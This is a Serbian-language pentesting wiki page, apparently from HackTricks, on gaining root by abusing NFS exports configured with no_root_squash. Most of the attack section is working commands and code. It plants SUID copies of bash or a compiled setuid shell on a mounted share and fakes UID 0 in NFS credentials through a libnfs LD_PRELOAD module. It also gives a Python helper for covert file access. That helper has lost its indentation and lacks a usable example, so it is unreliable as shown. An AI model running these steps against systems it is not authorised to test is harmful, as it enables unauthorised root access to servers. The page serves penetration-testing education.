# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije o Squashing-u

Sa NFS AUTH_SYS/AUTH_UNIX, server zasniva provere dozvola za fajlove na `uid` i `gid` vrednostima dostavljenim u svakom RPC zahtevu. Drugi security flavors, kao što je Kerberos, koriste drugačije kredencijale, a server može mapirati numeričke kredencijale pre provere dozvola.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapira svaki UID i GID na anonimni nalog, koji je na Linux-u podrazumevano `nobody` (65534). `no_all_squash` je podrazumevana vrednost za zahteve koji nisu root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Ovo je podrazumevana vrednost na Linux-u i mapira zahteve sa UID/GID 0 (root) na anonimni nalog; ostali UID-ovi i GID-ovi se ne squash-uju.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Onemogućava root squashing, tako da zahtevi sa UID/GID 0 mogu biti obrađeni kao root na serveru.<sup>[[4]](#references)</sup>

Ako klijent kome je dozvoljen pristup može da mount-uje export sa dozvolom upisa u **`/etc/exports`**, konfigurisan sa **`no_root_squash`**, njegovi UID/GID 0 zahtevi mogu tamo da upisuju podatke kao root korisnik servera.<sup>[[4]](#references)</sup>

Za više informacija o **NFS** pogledajte:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opcija 1 pomoću bash-a:
- Na klijentu kome je dozvoljen pristup, mount-ujte export sa dozvolom upisa kao root, kopirajte **`/bin/bash`** u njega, postavite njegov **SUID** bit i izvršite ga iz victim mount-a koji ne koristi `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Da bi upload-ovani fajl ostao u vlasništvu root-a, server mora da koristi **`no_root_squash`**. Ako se root squash-uje, SUID binarni fajl za drugi nalog moguć je samo kada klijent može legitimno da ga kreira ili bude njegov vlasnik sa numeričkim UID/GID tog naloga.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcija 2 pomoću kompajliranog C koda:
- Montirajte direktorijum sa dozvoljenog klijenta, kopirajte kompajlirani payload koji zloupotrebljava **SUID** dozvole, postavite njegov **SUID** bit i izvršite ga sa žrtve (pogledajte neke [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ista ograničenja kao ranije
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Imajte na umu da, ako možete da kreirate **tunnel sa svoje mašine do mašine žrtve, i dalje možete koristiti Remote verziju za iskorišćavanje ove privilege escalation ranjivosti tunelovanjem potrebnih portova**.\
> Sledeći trik je koristan kada `/etc/exports` ograničava export na IP adresu žrtve: remote client ne može da ga mountuje, ali lokalna tehnika može da radi preko share-a koji je već mountovan na dozvoljenom hostu.<sup>[[2]](#references)</sup>\
> Za ovaj neprivilegovani libnfs metod, export u **`/etc/exports`** mora da koristi `insecure` flag kako bi proces mogao da koristi non-reserved source port; `secure` je podrazumevana vrednost, iako procesu koji može da binduje reserved port ova opcija nije potrebna.<sup>[[1]](#references)[[4]](#references)</sup>

### Osnovne informacije

NFSv3 AUTH_UNIX client uključuje svoj effective UID, GID i grupe u svakom pozivu, a server ih koristi za proveru dozvola. Ova lokalna tehnika zloupotrebljava taj model falsifikovanjem RPC credentials kroz [libnfs](https://github.com/sahlberg/libnfs); njegov preload module podržava override UID/GID vrednosti u NFS context-u.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompajliranje biblioteke

libnfs primer može zahtevati prilagođavanja za ciljni kernel; ovde korišćeni walkthrough posebno navodi da pre kompajliranja preload module-a treba zakomentarisati fallocate syscalls.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Izvođenje Exploit-a

Primer kreira mali C pomoćni program koji pokreće shell, zatim ga postavlja na share i koristi `ld_nfs.so` sa UID 0 u NFS kontekstu kako bi ga učinio SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompajlirajte exploit kod:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Postavite exploit na share i izmenite njegove dozvole lažiranjem UID-a**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Izvršite exploit da biste dobili root privilegije**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell za prikriveni pristup datotekama

Kada se dobije root pristup, ovaj obrazac `nfsh.py` postavlja efektivni UID na UID ciljne datoteke pre pokretanja komande, čime omogućava pristup bez rekurzivne promene vlasništva.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Pokreni ovako:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Priča o manje poznatom NFS privesc-u](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifikacija protokola NFS verzije 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
